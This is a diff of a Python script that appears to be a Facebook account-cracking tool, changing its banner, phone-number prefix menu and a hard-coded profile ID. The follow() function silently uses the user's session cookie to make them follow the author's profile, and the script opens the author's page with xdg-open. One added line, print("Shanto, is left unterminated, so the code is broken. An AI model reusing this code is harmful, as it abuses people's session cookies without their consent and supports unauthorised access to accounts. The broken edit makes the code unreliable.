@@ -45,7 +45,7 @@ def cek_apk(session,coki):
             print('')
 
 def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
+        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=61550726636094', {
             'cookie': coki }, **('cookies',)).text, 'html.parser')
         get = r.find('a', 'Ikuti', **('string',)).get('href')
         session.get('https://mbasic.facebook.com' + str(get), {
@@ -91,14 +91,12 @@ bu = current.month
 ha = current.day
 today = date.today()
 os.system('xdg-open https://www.facebook.com/mdshantomia2021/')
-logo =("""\033[0;92m
-╔═══════════════════════════════════════════════════╗
-          
- __ _                 _        
-/ _\ |__   __ _ _ __ | |_ ___  
-\ \| '_ \ / _` | '_ \| __/ _ \ 
-_\ \ | | | (_| | | | | || (_) |
-\__/_| |_|\__,_|_| |_|\__\___/ 
+logo =("""\033[0;92m 
+      __ _                 _        
+     / _\ |__   __ _ _ __ | |_ ___  
+    \ \| '_ \ / _` | '_ \| __/ _ \ 
+    _\ \ | | | (_| | | | | || (_) |
+    \__/_| |_|\__,_|_| |_|\__\___/ 
                                
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
 \033[0;94m╠═══════════════════════════════════════════════════║
@@ -173,7 +171,7 @@ def xxr():
     os.system("clear")
     print(logo)
     print(f' [{xr}^{x}] Example>: {xr}019,017,018,92302,92301,91778{x}')
-    print(" ══════════════════════════════════════════")
+    print("Shanto
     rk1 = '0171'
     rk2 = '0172'
     rk3 = '0175'
